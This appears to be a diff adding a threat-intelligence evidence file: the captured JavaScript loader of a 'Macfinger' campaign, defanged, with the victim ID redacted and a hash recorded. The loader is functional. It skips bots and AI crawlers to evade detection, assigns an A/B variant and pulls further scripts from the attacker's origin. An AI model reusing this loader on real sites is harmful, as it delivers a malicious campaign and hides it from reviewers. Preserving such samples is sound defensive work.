@@ -1,0 +1,6 @@
+// EVIDENCIA: cargador t.js de la campana Macfinger, tal como lo sirvio
+// ashen-trace-zephyr-draeix[.]life el 2026-09-23 20:36 UTC. TLP:CLEAR.
+// El identificador de la victima esta REDACTADO. Guardado como .txt: NO ejecutar.
+// sha256 del original (con el ID real): f24ba015ec921221ed244fae24bdb9a5d04407c203323c985f716518e617c829
+
+(function(){if(/bot|crawler|spider|crawling|facebookexternalhit|Facebot|Twitterbot|LinkedInBot|Slackbot|Discordbot|WhatsApp|TelegramBot|Googlebot|Bingbot|Baiduspider|YandexBot|DuckDuckBot|Sogou|Exabot|ia_archiver|AhrefsBot|SemrushBot|MJ12bot|DotBot|PetalBot|Bytespider|GPTBot|ChatGPT|ClaudeBot|Anthropic|CCBot|DataForSeoBot/i.test(navigator.userAgent))return;var o=document.currentScript.src.split("?")[0].replace(/\/t\.js$/,"");window.__analyticsUrl=o;window.__analyticsSite="<ID_VICTIMA_REDACTADO>";var K="__ab_v",v=localStorage.getItem(K);if(!v){v=Math.random()*100<50?"B":"A";localStorage.setItem(K,v)}window.__abVariant=v;function l(s,d){var e=document.createElement("script");e.async=true;e.src=o+s;if(d)e.dataset.site=d;document.head.appendChild(e)}l("/t.4b1009ff6c3f.js","<ID_VICTIMA_REDACTADO>");l(v==="B"?"/ext-b.b96ad0785c08.js":"/ext.fb58e796b418.js");})();
